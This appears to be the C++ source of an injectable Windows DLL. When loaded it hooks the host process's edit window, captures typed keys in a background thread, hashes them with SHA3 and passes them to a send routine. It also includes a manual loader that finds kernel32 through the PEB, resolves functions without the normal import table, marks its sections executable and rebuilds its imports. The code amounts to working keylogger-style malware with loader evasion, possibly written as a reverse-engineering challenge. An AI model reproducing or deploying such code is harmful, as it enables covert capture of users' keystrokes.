// dllmain.cpp : Defines the entry point for the DLL application.
#include "ntos.h"
#include <thread>
#include <Windows.h>
#include "WindowCtl.h"
#include "WndHook.h"
#include "DbgCtl.h"
#include "sha3.h"


void toHex(std::string& d)
{
	const auto convToStr = [](byte b) -> char {
		if (b > 0x9)
		{
			return 'A' + (b - 0xa);
		}
		return '0' + b;
	};
	std::string tmp;
	for (const auto& s : d)
	{
		auto hi = (int(s) >> 4) & 0xf;
		auto lo = int(s) & 0xf;
		tmp += convToStr(hi);
		tmp += convToStr(lo);
	}
	d = tmp;
}

void cryptString(std::string& key)
{
	sha3_context c;
	std::string tmp;

	for (size_t i = key.size() - 1; i < key.size(); --i)
	{
		sha3_Init512(&c);
		sha3_Update(&c, key.c_str() + i, key.size() - i);
		tmp += ((uint8_t*)sha3_Finalize(&c))[0];
	}
	key = tmp;
	toHex(key);
}

DWORD WINAPI mymain(PVOID)
{
	std::string key;
	DbgCtl dbgctl;
	while(true)
	{ 
		WndHook::getInstance()->awaitKey(key);
		switch (dbgctl.getCryptoMethod())
		{
		case 0xe466334e:
			cryptString(key);
			dbgctl.sendGeneric(key.length(), key.data());
		default:
			break;
		}
	}
}

HMODULE getModuleHandle(const char* t)
{
	PEB* peb = NtCurrentPeb();
	PEB_LDR_DATA* ldr = peb->Ldr;
	for (
		LDR_DATA_TABLE_ENTRY* ldr_data = reinterpret_cast<LDR_DATA_TABLE_ENTRY*>(ldr->InLoadOrderModuleList.Flink);
		ldr_data;
		ldr_data = reinterpret_cast<LDR_DATA_TABLE_ENTRY*>(reinterpret_cast<LIST_ENTRY*>(ldr_data)->Flink)
		)
	{

		bool same = true;
		for (size_t i = 0; i < ldr_data->BaseDllName.Length / 2; ++i)
		{
			//if (!ldr_data->BaseDllName.Buffer) {
			//	same = false;
			//	break;
			//}
			if ((t[i] | 0x20) != (ldr_data->BaseDllName.Buffer[i] | 0x20))
			{
				same = false;
				break;
			}
		}

		if(same)
			return (HMODULE)ldr_data->DllBase;
	}

	return nullptr;
}

BOOL strings_cmp(const char * s1, const char * s2)
{
	size_t i;
	if (!s1 || !s2) return -1;
	for (i = 0; s1[i] && s2[i]; ++i)
		if (s1[i] != s2[i]) return 1;
	return 0; //!(s1[i] == s2[i]);
}
#define RVA2OFS(Type, Base, RVA) ((Type *)((size_t)(Base) + (size_t)(RVA)))       
PVOID getProcAddressTotalyNotStolenFromSomewhere(size_t ImageBase, const char* RoutineName)
{
	USHORT OrdinalNumber;
	PULONG NameTableBase;
	PUSHORT NameOrdinalTableBase;
	PULONG Addr;
	LONG Result, High, Low = 0, Middle = 0;
	LPVOID FunctionAddress = NULL;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;

	PIMAGE_FILE_HEADER			fh1 = NULL;
	PIMAGE_OPTIONAL_HEADER32	oh32 = NULL;
	PIMAGE_OPTIONAL_HEADER64	oh64 = NULL;

	fh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew + sizeof(DWORD));
	oh32 = (PIMAGE_OPTIONAL_HEADER32)((ULONG_PTR)fh1 + sizeof(IMAGE_FILE_HEADER));
	oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;

	if (fh1->Machine == IMAGE_FILE_MACHINE_AMD64) {
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
			oh64->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	}
	else {
		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ImageBase +
			oh32->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	}

	NameTableBase = (PULONG)(ImageBase + (ULONG)ExportDirectory->AddressOfNames);
	NameOrdinalTableBase = (PUSHORT)(ImageBase + (ULONG)ExportDirectory->AddressOfNameOrdinals);
	High = 0;
	size_t i = 0;
	for(i = 0; i < ExportDirectory->NumberOfNames - 1; ++i)
	{
		Result = strings_cmp(
			RoutineName,
			(PCHAR)(ImageBase + NameTableBase[i])
		);
		if (Result == 0) {
			High = 1; break;
		}
	} 
	if (!High)
		return NULL;

	OrdinalNumber = NameOrdinalTableBase[i];
	if ((ULONG)OrdinalNumber >= ExportDirectory->NumberOfFunctions)
		return NULL;

	Addr = (PDWORD)((DWORD_PTR)ImageBase + ExportDirectory->AddressOfFunctions);
	FunctionAddress = (LPVOID)((DWORD_PTR)ImageBase + Addr[OrdinalNumber]);

	return FunctionAddress;
}


__declspec(dllexport) void fixImports(PVOID base)
{
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
	PIMAGE_NT_HEADERS nt = PIMAGE_NT_HEADERS((size_t)dos + dos->e_lfanew);
	size_t k32 = (size_t)getModuleHandle("kernel32.dll");
	BOOL (WINAPI* VirtualProtect)(
			_In_  LPVOID lpAddress,
			_In_  SIZE_T dwSize,
			_In_  DWORD flNewProtect,
			_Out_ PDWORD lpflOldProtect
		) = (decltype(VirtualProtect))getProcAddressTotalyNotStolenFromSomewhere(k32, "VirtualProtect");

	HMODULE (WINAPI* LoadLibraryA)(
			_In_ LPCSTR lpLibFileName
		) = (decltype(LoadLibraryA))getProcAddressTotalyNotStolenFromSomewhere(k32, "LoadLibraryA");

	FARPROC(WINAPI* GetProcAddress)(
			_In_ HMODULE hModule,
			_In_ LPCSTR lpProcName
		) = (decltype(GetProcAddress))getProcAddressTotalyNotStolenFromSomewhere(k32, "GetProcAddress");

	DWORD oldpr;
	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
	for (size_t i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec)
	{
		VirtualProtect((LPBYTE)base + sec->VirtualAddress, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldpr);
	}
	// Resolve DLL references
	PIMAGE_IMPORT_DESCRIPTOR iimport_desc;
	PIMAGE_IMPORT_BY_NAME iimport_name;
	PIMAGE_THUNK_DATA ithunk_data, ithunk_data_org;

	iimport_desc = (PIMAGE_IMPORT_DESCRIPTOR)((size_t)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	while (iimport_desc->Name)
	{
		ithunk_data_org = (PIMAGE_THUNK_DATA)((size_t)base + iimport_desc->OriginalFirstThunk);
		ithunk_data = (PIMAGE_THUNK_DATA)((size_t)base + iimport_desc->FirstThunk);

		HMODULE hMod = LoadLibraryA((char*)((size_t)base + iimport_desc->Name));

		if (!hMod)
		{
			++iimport_desc;
			continue;
		}

		while (ithunk_data_org->u1.AddressOfData)
		{
			//if (ithunk_data_org->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			//{
			//	ithunk_data->u1.Function = (size_t)getProcAddressTotalyNotStolenFromSomewhere(h_mod, (char*)(ithunk_data_org->u1.Ordinal & 0xFFFF));
			//}
			//else
			//{
	
			//iimport_name = (PIMAGE_IMPORT_BY_NAME)((size_t)base + ithunk_data_org->u1.AddressOfData);
			//char* func = (char*)getProcAddressTotalyNotStolenFromSomewhere(h_mod, (char*)(iimport_name->Name));
			//if (strings_cmp(func, "NTDLL") == 0)
			//{
			//	size_t ntdll = (size_t)getModuleHandle("ntdll.dll");
			//	ithunk_data->u1.Function = (size_t)getProcAddressTotalyNotStolenFromSomewhere(ntdll, func + 6);
			//}
			//else
			//{
			//	ithunk_data->u1.Function = (size_t)func;
			//}
			//}
			iimport_name = (PIMAGE_IMPORT_BY_NAME)((size_t)base + ithunk_data_org->u1.AddressOfData);
			ithunk_data->u1.Function = (size_t)GetProcAddress(hMod, (char*)(iimport_name->Name));
			++ithunk_data;
			++ithunk_data_org;
		}

		++iimport_desc;
	}
	BOOL(APIENTRY* DllE)(HMODULE hModule,
		DWORD  ul_reason_for_call,
		LPVOID lpReserved) = (decltype(DllE))(nt->OptionalHeader.AddressOfEntryPoint + (size_t)base);
	DllE((HMODULE)base, DLL_PROCESS_ATTACH, NULL);
	//DllE((HMODULE)base, DLL_THREAD_ATTACH, NULL);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	//fixImports(hModule);
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		HANDLE mtx = CreateMutex(NULL, TRUE, L"DurexMutex");
		if (!mtx && GetLastError() == ERROR_ALREADY_EXISTS) return TRUE;

		DWORD tid;
		WindowCtl ctl{ GetCurrentProcessId() };
		ctl.getEditWindow();
		WndHook::getInstance()->init(ctl.getHwnd());
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mymain, 0, 0, &tid);
		CloseHandle(mtx);
	}
	return TRUE;
 //   switch (ul_reason_for_call)
 //   {
 //   case DLL_PROCESS_ATTACH:
	//	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mymain, 0, 0, &tid);
	//	break;
 //   case DLL_THREAD_ATTACH:
 //   case DLL_THREAD_DETACH:
 //   case DLL_PROCESS_DETACH:
 //       break;
 //   }
 //   return TRUE;
}

